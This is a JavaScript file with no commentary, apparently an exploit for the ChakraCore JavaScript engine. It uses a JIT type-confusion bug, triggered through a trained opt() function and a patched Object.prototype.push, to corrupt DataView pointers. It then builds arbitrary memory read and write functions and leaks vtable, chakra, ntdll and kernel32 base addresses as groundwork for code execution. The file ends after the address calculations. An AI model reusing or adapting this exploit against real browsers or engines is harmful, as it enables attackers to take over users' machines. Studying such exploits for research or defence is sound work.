obj = {}
obj.a = 1;
obj.b = 2;  
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100000));

function readPtr(addr)
{
    dv1.setUint32(0x38, addr & 0xFFFFFFFF, true);
    dv1.setUint32(0x3C, (addr / 0x100000000) & 0xFFFFFFFF, true);
	var value = SignedDwordToUnsignedDword(dv2.getInt32(0, true));
	value += SignedDwordToUnsignedDword( dv2.getInt32(4, true)) * 0x100000000;
	return value;
}

function writePtr(addr, value)
{
    dv1.setUint32(0x38, addr & 0xFFFFFFFF, true);
    dv1.setUint32(0x3C, (addr / 0x100000000) & 0xFFFFFFFF, true);

    dv2.setInt32(0, value & 0xFFFFFFFF, true);
    dv2.setInt32(4, (value / 0x100000000) & 0xFFFFFFFF, true);
}

function writeDword(addr, value)
{
    dv1.setUint32(0x38, addr & 0xFFFFFFFF, true);
    dv1.setUint32(0x3C, (addr / 0x100000000) & 0xFFFFFFFF, true);

    dv2.setInt32(0, value & 0xFFFFFFFF, true);
}

function SignedDwordToUnsignedDword(sd)
{
    return (sd < 0) ? sd + 0x100000000 : sd;
}



function opt(a, b) {
    a.b = 2;
    b.push(0);
    a.a = obj;
}

function main() {
    Object.prototype.push = Array.prototype.push;

    for (let i = 0; i < 1000; i++) {
        let a = {a: 1, b: 2};
        opt(a, {});
    }

    let o = {a: 1, b: 2};
    console.log(Object.keys(o))
    Math.sin(1);

    opt(o, o);

    o.length = dv1;
    obj.h = dv2;
    Math.sin(1);

    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);
    vtableAddr = vtable_lo + vtable_hi * 0x100000000;
    console.log("vtable address is:", "0x" + vtableAddr.toString(16));

    buffer_lo = dv1.getUint32(0x38, true);
    buffer_high = dv1.getUint32(0x3C, true);
    bufferAddr = SignedDwordToUnsignedDword(buffer_lo) + SignedDwordToUnsignedDword(buffer_high) * 0x100000000;
    print("buffer address is:", "0x" + bufferAddr.toString(16));

    chakraBase = vtableAddr - 0x5676b0;
    ntdllAddr = readPtr(chakraBase + 0x5B5310);
    ntdllBase = ntdllAddr - 0x8f210;
    ldrpworkq = ntdllBase + 0x1652d0;

    kernel32Addr = readPtr(chakraBase + 0x5B4988);
    kernel32Base = kernel32Addr - 0x15d10;
    loadlibstub = kernel32Base + 0x1ec50;
}

main();
